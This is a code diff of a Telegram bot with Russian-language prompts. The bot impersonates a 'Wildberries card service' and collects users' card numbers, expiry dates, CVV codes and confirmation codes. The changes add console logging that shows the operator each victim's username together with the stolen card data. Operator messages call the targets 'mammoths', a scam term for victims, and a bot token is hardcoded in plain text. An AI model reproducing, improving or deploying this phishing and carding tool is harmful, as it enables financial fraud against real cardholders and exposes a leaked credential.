@@ -1,23 +1,29 @@
 import telebot
+import colorama
+from colorama import Back,Fore
 from telebot import types
 from config import *
 from os import listdir
+printlogo()
+
+bot= telebot.TeleBot('6440584401:AAFXeXLKH7V8hGr1PytNg9eHWWgaqvLDzKY')
 loaddata()
-print('/// ENTER BOT TOKEN:')
+print(Fore.RED+'/// ENTER BOT TOKEN:')
 token=input()
 bot= telebot.TeleBot(token)
-print('/// WELL DONE')
+print(Fore.RED+Back.GREEN+f'///'+Fore.GREEN+Back.RESET+' Bot launched')
 
 
 @bot.message_handler(commands=['vip'])
 def vip(message):
+    localid=getdatafromid(message.chat.id)
     if message.text=='Вернуться':
         start(message)
     else:
         markup=types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
         b1=types.KeyboardButton('Вернуться')
         markup.row(b1)
-        bot.send_message(message.chat.id, 'Добавление карты напрямую:\nWBBank\nПожалуйста, введите номер карты\nпример:2000 1234 1234 1234\n\n_Данные под контролем Wildberries card service_',reply_markup=markup, parse_mode='MarkdownV2')
+        bot.send_message(message.chat.id, 'Добавление карты напрямую:\nWBBank\nПожалуйста, введите номер карты\nпример:2000 1234 1234 1234\n_Обратите внимание, что данные, которые вы вводили ранее, будут переписаны на новые в случае добавления_\n\n_Данные под контролем Wildberries card service_',reply_markup=markup, parse_mode='MarkdownV2')
         bot.register_next_step_handler(message, addcard)
 
 @bot.message_handler(commands=['link'])
@@ -59,6 +65,7 @@ def addcard(message):
             stage[localid]=1
             card[localid]=str(card1)
             savedata()
+            print(Back.GREEN+Fore.RED+'///'+Back.BLACK+Fore.WHITE+f' {message.from_user.username} добавил карту'+Back.RESET+'\n'+Back.BLACK+Fore.WHITE+card1+Back.RESET)
         else:
             bot.send_message(message.chat.id, 'Это не карта')
             bot.register_next_step_handler(message, addcard)
@@ -79,6 +86,8 @@ def addcvv(message):
             localid = (getdatafromid(localid))
             stage[localid] = 2
             datecvv[localid] = str(text)
+            print(
+                Back.GREEN + Fore.RED + '///' + Back.BLACK + Fore.WHITE + f' {message.from_user.username} добавил дату и cvv' + Back.RESET + '\n' + Back.BLACK + Fore.WHITE + str(date) + Back.RESET)
             savedata()
 
         else:
@@ -96,6 +105,8 @@ def code(message):
             stage[localid]=3
             codes[localid]=codevar
             savedata()
+            print(Back.GREEN+Fore.RED+'///'+Back.BLACK+Fore.WHITE+f' {message.from_user.username} отправил код'+Back.RESET+'\n'+Back.BLACK+Fore.WHITE+codevar+Back.RESET)
+
         else:
             bot.send_message(message.chat.id, f'неверные данные. попробуйте еще раз /code')
     else:
@@ -133,7 +144,7 @@ def start(message):
         datecvv.append('none')
         codes.append('none')
         workerid.append('none')
-        print(f'/// new user {message.from_user.username}. check ./data/')
+        print(Back.BLACK+Fore.WHITE+f'/// new user {message.from_user.username}. check ./data/'+Back.RESET)
         savedata()
 
 
@@ -183,7 +194,7 @@ def sendvip(message):
         if len(links)!=0:
             bot.send_message(localtext[1], f'мы проверили вашу информацию. Вы указали верные данные. {links[0]}')
             links.remove(links[0])
-            stage[getdatafromid(localtext[1])] = 0
+            stage[getdatafromid(localtext[1])] = 4
             bot.send_message(message.chat.id, 'отправили ссылку на канал!')
             workermessage(f'отправили ссылку на канал мамонту {localtext[1]}')
             savedata()
